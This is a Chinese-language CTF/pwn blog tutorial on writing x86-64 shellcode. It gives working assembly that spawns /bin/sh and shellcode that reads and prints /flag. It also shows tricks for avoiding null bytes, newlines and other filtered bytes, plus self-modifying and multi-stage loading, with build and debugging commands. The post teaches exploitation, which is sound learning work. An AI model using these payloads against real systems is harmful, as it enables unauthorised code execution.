---
layout: post
tags: [pwn]
title: "shellcode"
date: 2024-8-8
author: wsxk
comments: true
---

- [1. 介绍: shellcode是什么](#1-介绍-shellcode是什么)
- [2. 编写shellcode](#2-编写shellcode)
- [3. debugging shellcode](#3-debugging-shellcode)
- [4. Forbidden Bytes](#4-forbidden-bytes)
  - [4.1 常见的限制](#41-常见的限制)
  - [4.2 创造性地构造shellcode!](#42-创造性地构造shellcode)
- [5. Data Execution Prevention](#5-data-execution-prevention)
- [6. shellcode program](#6-shellcode-program)


## 1. 介绍: shellcode是什么<br>
谈起`shellcode`，就要谈起`冯诺依曼架构(Von Neumann Architecture)和哈佛架构(Harvard Architecture)`了<br>
冯诺依曼架构把代码和数据等同的，而哈佛架构设计上就把代码和数据隔离开来。<br>
当今几乎所有架构，例如`x86, ARM, MIPS, PPC(power pc), SPARC(Scalable Processor Architecture,国际最流行的risc体系架构, etc`，都是冯诺依曼架构。<br>
更多了解[https://zhuanlan.zhihu.com/p/481536761](https://zhuanlan.zhihu.com/p/481536761)<br>
哈佛架构只被用在`AVR, PIC`里（这俩架构都主要用在单片机上）<br>
当冯诺依曼架构中，因为数据和代码是混合在一起的，这就导致了`shellcode`的产生<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2024-3-25/20240808221010.png)
上图中，因为一个编程失误，导致**用户输入(data)被作为代码(code)执行**。<br>

## 2. 编写shellcode<br>
`shellcode`之所以叫`shellcode`，是因为**利用的目标就是达成任意命令执行**,而一个经典的攻击模式就是启动`shell`:`execve("/bin/sh", NULL, NULL)`<br>
```asm
.global _start
_start:
.intel_syntax noprefix
mov rax, 59		# this is the syscall number of execve
lea rdi, [rip+binsh]	# points the first argument of execve at the /bin/sh string below
mov rsi, 0		# this makes the second argument, argv, NULL
mov rdx, 0		# this makes the third argument, envp, NULL
syscall			# this triggers the system call
binsh:				# a label marking where the /bin/sh string is
.string "/bin/sh"
```
在写完`asm`后，介绍一下编译等涉及汇编的命令吧<br>
```
1. Assembling shellcode:
gcc -nostdlib -static shellcode.s -o shellcode-elf

2. Extracting shellcode:
objcopy --dump-section .text=shellcode-raw shellcode-elf

3. Disassembling shellcode:
objdump -M intel -d shellcode-elf

4. Sending shellcode to the stdin of a process (with user input afterwards):
cat shellcode-raw /dev/stdin | /vulnerable_process

5. Strace a program with your shellcode as input:
cat shellcode-raw | strace /vulnerable_process

6. Debug a program with your shellcode as input:
gdb /vulnerable_process
(gdb) r < shellcode-raw
```
这些命令在编写`shellcode`时是非常有用的，下面还有一些好用的工具可供选择！<br>
```
1. pwntools (https://github.com/Gallopsled/pwntools), a library for writing exploits (and shellcode).

2. rappel (https://github.com/yrp604/rappel) lets you explore the effects of instructions.
easily installable via https://github.com/zardus/ctf-tools  

3. amd64 opcode listing: http://ref.x86asm.net/coder64.html 

4. Several gdb plugins exist to make exploit debugging easier!
https://github.com/scwuaptx/Pwngdb
https://github.com/pwndbg/pwndbg
https://github.com/longld/peda 
```

## 3. debugging shellcode<br>
如果想以高层次的信息来debug，可以用:<br>
```
gcc -nostdlib -static shellcode.s -o shellcode.elf
strace ./shellcode.elf
```
来追踪。<br>
如果想要每条汇编的执行，可以用：<br>
```
gdb ./shellcode-elf
```

## 4. Forbidden Bytes<br>
编写shellcode的时候不总是一帆风顺，即使你碰到了可以写入shellcode1的漏洞，在利用漏洞之前，可能程序对输入做了限制，这里就需要一些其他的`trick`<br>
### 4.1 常见的限制<br>
某些字符在某些函数下会被截断，导致shellcode被截断:<br>

| Byte (Hex Value)      | Problematic Methods |
| :-----------: | :-----------: |
| Null byte \0 (0x00)      | strcpy       |
| Newline \n (0x0a)   | scanf gets getline fgets     |
|Carriage return \r (0x0d)| scanf|
|Space (0x20)| scanf |
|Tab \t (0x09)| scanf |
|DEL (0x7f)| protocol-specific (telnet, VT100, etc)|

### 4.2 创造性地构造shellcode!<br>
直接看例子：展示如何构造神奇shellcode！<br>

|filter| bad| good|
| :-----------:| :--------------:|:-------------:|
|no NULLs| mov rax, 0 (48c7c0**00000000**)|xor rax, rax (4831C0)|
|no NULLs| mov rax, 5 (48c7c005**000000**)|xor rax, rax; mov al, 5 (4831C0B005)|
|no newlines| mov rax, 10 (48c7c0**0a**000000)|mov rax, 9; inc rax (48C7C00900000048FFC0)|
|no NULLs| mov rbx, 0x67616c662f "/flag" (48BB2F666C6167**000000**)|mov ebx, 0x67616c66; shl rbx, 8; mov bl, 0x2f (BB666C616748C1E308B32F)|
|printables| mov rax, rbx (48**89d8**)|push rbx; pop rax (5358, "SX")|

如果约束太多，导致你很难用同义的shellcode绕过，**如果你的shellcode的内存映射是可写的**，需要记住：**code==data**<br>
比如绕过一个`int 3的检查`<br>
```
inc BYTE PTR [rip]
	.byte 0xcb
```
测试用编译命令:`gcc -Wl,-N --static -nostdlib -o test test.s
`<br>
如果约束太复杂了，很难做有用的操作，一个可选的办法是**multi-stage shellcode**，即分阶段注入shellcode<br>
```
1. read(0, rip, 1000).
2. 写入你想写的任何东西，当然这里也要求是映射的代码段是可写的
```
还有一些情况，你的shellcode可能被压缩/加密/分类，需要你自己思考如何写shellcode！<br>

## 5. Data Execution Prevention<br>


## 6. shellcode program<br>
使用如下命令进行编译:<br>
```
gcc -nostdlib -static shellcode.s -o shellcode.elf
objcopy --dump-section .text=shellcode.raw shellcode.elf
```
汇编代码如下:<br>
```asm
.global _start
_start:
.intel_syntax noprefix
        mov rax, 2 # sys_create
        lea rdi, [rip+file_name] # file_name
        mov rsi, 2 # O_RDWR
        syscall
        lea rdi, [rip+file_fd]
        mov [rdi], eax

        mov rax, 0 # sys_read
        mov edi, [rip+file_fd]
        lea rsi, [rip+buffer]
        mov edx, [rip+buffer_len]
        syscall

        mov rax, 1 # sys_write
        mov rdi, 1 # stdout
        lea rsi, [rip+buffer]
        mov edx, [rip+buffer_len]
        syscall
binsh:
        .string "/bin/sh"
file_name:
        .string "/flag"
file_fd:
        .long 0
buffer:
        .space 0x100
buffer_len:
        .long 0x100
```
